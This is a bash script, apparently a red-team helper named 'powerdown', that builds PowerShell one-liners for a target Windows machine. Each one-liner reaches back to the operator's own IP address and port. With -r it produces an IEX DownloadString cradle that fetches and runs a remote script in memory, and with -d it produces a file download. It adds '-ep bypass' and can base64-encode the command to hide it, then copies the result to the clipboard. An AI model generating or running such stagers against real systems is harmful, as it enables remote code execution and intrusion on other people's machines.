#!/bin/bash

if [ $# -lt 4 ]
then
    echo "Usage: powerdown -r/-d [-b64] <interface> <port> <filename>"
    exit
fi

if [ $# -eq 5 ]
then
    b64=$2
    interface=$3
    ip=$(ifconfig $interface | grep -oP 'inet \d+\.\d+\.\d+\.\d+' | cut -d ' ' -f 2)
    remote="http://$ip:$4/$5"
    file=$5
else
    b64=''
    interface=$2
    ip=$(ifconfig $interface | grep -oP 'inet \d+\.\d+\.\d+\.\d+' | cut -d ' ' -f 2)
    remote="http://$ip:$3/$4"
    file=$4
fi

if [ $1 = '-r' ]
then
    cmd="IEX(new-object System.Net.WebClient).DownloadString('$remote')"
    # cmd="powershell -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command \"IEX(new-object System.Net.WebClient).DownloadString('$remote')\""
    # echo -n "powershell -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command \"IEX(new-object System.Net.WebClient).DownloadString('$remote')\"" | xclip -in -sel c
    # echo ""
    # echo "Command copied to clipboard"
elif [ $1 = '-d' ]
then
    outfile=$(echo $file | rev | cut -d '/' -f 1 | rev)
    cmd="(new-object System.Net.WebClient).DownloadFile('$remote','$outfile')"
    # echo -n "powershell -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command \"(new-object System.Net.WebClient).DownloadFile('$remote','$outfile')\"" | xclip -in -sel c
    # echo ""
    # echo "Command copied to clipboard"
fi

if [ $b64 = '-b64' ]
then
    b64_cmd=$(echo -n $cmd | iconv -f ASCII -t UTF-16LE | base64 -w 0)
    clipped="powershell -nop -ep bypass -e \"$b64_cmd\""
else
    clipped="powershell -nop -ep bypass -c \"$cmd\""
fi

echo $clipped
echo -n $clipped | xclip -in -sel c
echo ""
echo "Command copied to clipboard"
